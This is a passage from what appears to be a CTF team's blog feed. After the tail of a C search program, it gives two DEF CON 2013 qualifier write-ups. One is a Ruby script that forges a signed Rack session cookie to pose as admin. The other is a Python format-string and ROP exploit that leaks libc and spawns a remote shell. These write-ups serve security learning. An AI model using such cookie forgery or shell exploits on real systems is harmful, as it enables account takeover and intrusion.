        if (XY[newX][newY] != -1 &amp;&amp; XY[newX][newY] &lt;= XY[x][y] + 1) continue;
        XY[newX][newY] = XY[x][y] + 1;
        dfs2(newX, newY);
    }
}

void solve() {
    scanf("%*s%d", &amp;P);

    scanf("%*s%*d");
    scanf("%d%d", &amp;N, &amp;M);

    scanf("%*s%*d");
    scanf("%d%d", &amp;fX, &amp;fY);



    Key.t.resize(N * M * 9);
    Key.len.resize(N * M);

    scanf("%*s%d", &amp;eN);
    for (int i=0; i&lt;eN; i++) {
        int tx, ty;
        scanf("%d%d", &amp;tx, &amp;ty);

        Key.now.pb(mp(tx, ty));
        Key.t[get(tx, ty) * 9] = true;
        Key.used.pb(true);
    }

    int nN;
    scanf("%*s%d", &amp;nN);
    memset(Null, 0, sizeof(Null));
    memset(Null2, 0, sizeof(Null2));
    for (int i=0; i&lt;nN; i++) {
        int tx, ty;
        scanf("%d%d", &amp;tx, &amp;ty);
        Null[tx][ty] = true;
        Null2[tx][ty] = true;
    }



    memset(XY, -1, sizeof(XY));
    XY[fX][fY] = 0;
    dfs2(fX, fY);

    node base = Key;
    for (UP=6; ; UP++) {
        dfs(0);
        Key = base;
    }
}

int main() {
    solve();
}
</code></pre>

<h1 id="result">Result</h1>

<p>You can check out <a href="http://ascii.io/a/3644">http://ascii.io/a/3644</a> for the result.</p>

<p><strong>CAVEAT:</strong> We use many heuristics in the program, so it will not guarantee success for every run.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 3dub 3 Writeup]]></title>
    <link href="http://www.blue-lotus.net//def-con-ctf-qualifier-2013-3dub-3-writeup/"/>
    <updated>2013-06-18T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//def-con-ctf-qualifier-2013-3dub-3-writeup</id>
    <content type="html"><![CDATA[<p>First of all, we got a ‘secrets’ link and ‘log in or create user’ form. When we create and login, the website redirect us to the ‘secrets’ page like this</p>

<pre><code>Secrets
name    owner   actions
key admin   show
nothing asdf    show
new secret
</code></pre>

<p>we’ve got some links to see secrets owned by other users, include the ‘admin’, or easily add a new secret ourselves.</p>

<p>Having a try to open the <a href="http://hypeman.shallweplayaga.me/secrets/0">admin’s secret</a>, we got a 500 Error Page with some error stack, which powered by the Ruby framework ‘Sinatra’.</p>

<p>From the very first sight of the page, it said ‘unauthorized’ as the error message and a piece of source code was provided</p>

<pre><code>end

  redirect '/secrets'
end

get '/secrets/:id' do
  s = SECRETS[params[:id].to_i]
  raise "unauthorized" if session[:user_name] != s.username

  haml :secret, locals: {secret: s}
end

helpers do
  def current_user
    return nil unless session[:user_name]
</code></pre>

<p>It meant that I’m not she secret’s holder. then have a look at the whole page, and you would find some environment variable in the ‘Rack ENV’ section, partly like</p>

<p>rack.session</p>

<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>

<p>rack.session.options</p>

<p><code>{:path=&gt;"/", :domain=&gt;nil, :expire_after=&gt;nil, :secure=&gt;false, :httponly=&gt;true, :defer=&gt;false, :renew=&gt;false, :sidbits=&gt;128, :secure_random=&gt;SecureRandom, :secret=&gt;"wroashsoxDiculReejLykUssyifabEdGhovHabno", :coder=&gt;#}</code></p>

<p>rack.session.unpacked_cookie_data</p>

<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>

<p>rack.request.cookie_hash</p>

<p><code>{"rack.session"=&gt;"BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n--d637305e23d6693f3ebe276b292293c7ff0b72e6"}</code></p>

<p>we’ve got some message:</p>

<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable <code>rack.session</code>, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe ‘wroashsoxDiculReejLykUssyifabEdGhovHabno’</p>

<p>By seeking the source code of rack, we found this(<a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb</a>)</p>

<pre><code>@secrets = options.values_at(:secret, :_old_secret).compact
# some code else
session_data = coder.encode(session)
if @secrets.first
  session_data &lt;&lt; "--#{generate_hmac(session_data, @secrets.first)}"
end 
# some code else
def generate_hmac(data, secret)
  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end
</code></pre>

<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>

<pre><code>if @secrets.size &gt; 0 &amp;&amp; session_data
    session_data, digest = session_data.split("--")
    session_data = nil unless digest_match?(session_data, digest)
end
</code></pre>

<p>Meanwhile, we knew the whole process of the session checking. thus, I’ve wrote a ruby script to figure out this stuff with this way</p>

<ul>
  <li>unpack(decode) the cookie to origin session data</li>
  <li>modify session_data.user_name to ‘admin’</li>
  <li>repack(encode) the session data to cookie string format</li>
  <li>calculate a new digest of the session data then build the cookie</li>
</ul>

<p>codes below for example</p>

<pre><code>#!/usr/bin/ruby
#Author: xelz@blue-lotus

require 'openssl'

# part of rack/lib/rack/session/cookie.rb
class Base64
    def encode(str)
        [str].pack('m')
    end

    def decode(str)
        str.unpack('m').first
    end

    # Encode session cookies as Marshaled Base64 data
    class Marshal &lt; Base64
        def encode(str)
            super(::Marshal.dump(str))
        end

        def decode(str)
            return unless str
            ::Marshal.load(super(str)) rescue nil
        end
    end
end

def generate_hmac(data, secret)
   OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end

exit() unless ARGV[0]

data = ARGV[0].split('--')[0]
# puts 'data is:'
# puts data, "\n"

coder = Base64::Marshal.new
data = coder.decode(data)
data['user_name'] = "admin"
data = coder.encode(data)
# puts 'modified data is:'
# puts data, "\n"
data = data

secret = 'wroashsoxDiculReejLykUssyifabEdGhovHabno'
# puts 'new digest string is:'
digest = generate_hmac(data, secret)
# puts digest, "\n"

puts 'cookie is'
cookie = data.gsub("\n", "%0A") + '--' + digest
puts cookie
</code></pre>

<p>run the script like this:</p>

<pre><code>xelz@blue-lotus:defconctf$echo -en 'BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n' | awk '{print $1"\\"}' | xargs ./hypeman.rb
cookie is
BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4=%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
</code></pre>

<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I’d like to use the Javascript Console in Chrome:</p>

<pre><code>document.cookie='rack.session=xxx;'
</code></pre>

<p>refresh the page, and enjoy <img src="http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>

<blockquote>
  <p>key</p>

  <p>watch out for this Etdeksogav</p>
</blockquote>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcon 21 Quals annyong writeup]]></title>
    <link href="http://www.blue-lotus.net//defcon-21-quals-annyong-writeup/"/>
    <updated>2013-06-17T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//defcon-21-quals-annyong-writeup</id>
    <content type="html"><![CDATA[<p>For the annyong service, PIE and ASLR are enabled. It’s easy to discover a format string vulnerability and a stack overflow vulnerability. By leveraging format string attack, libc address on the stack is leaked. Then we can calculate the <code>system</code>, <code>/bin/sh</code>, and <code>pop rdi; ret</code> gadget address in libc. Luckily we have same libc edition with the remote server and get the offsets correctly, or we could get the right libc address by using a brute-force attack in a small range. Then we got a shell by overwritten the stack.</p>

<p>Our code is as below:</p>

<pre><code>import struct, socket, telnetlib

def p64(addr):
    return struct.pack("&lt;Q", addr)

def interact(s):
    t = telnetlib.Telnet()                                                  
    t.sock = s                                                              
    t.interact()
    s.close()

def send_recv(s, buf):
    s.send(buf)
    return s.recv(4096)

HOST = "annyong.shallweplayaga.me"
PORT = 5679

s = socket.socket()
s.connect((HOST, PORT))

r = send_recv(s, "%173$p\n")
lib_ref = int(r, 16)

system_l = 0x45660
binsh_l = 0x1799d1
poprdi = 0x229f2
lib_h = 0x7ffff7a39ed8
lib_b = 0x7ffff7a60660 - system_l
lib_base = lib_ref - lib_h + lib_b

system_r = lib_base + system_l
binsh_r = lib_base + binsh_l
poprdi = lib_base + poprdi

payload = "A" * 0x810 + 'B' * 8 +  p64(poprdi) + p64(binsh_r) + p64(system_r)
r = send_recv(s, payload + "\n")

print "We got a shell:"
interact(s)
</code></pre>
]]></content>
  </entry>
  
</feed>
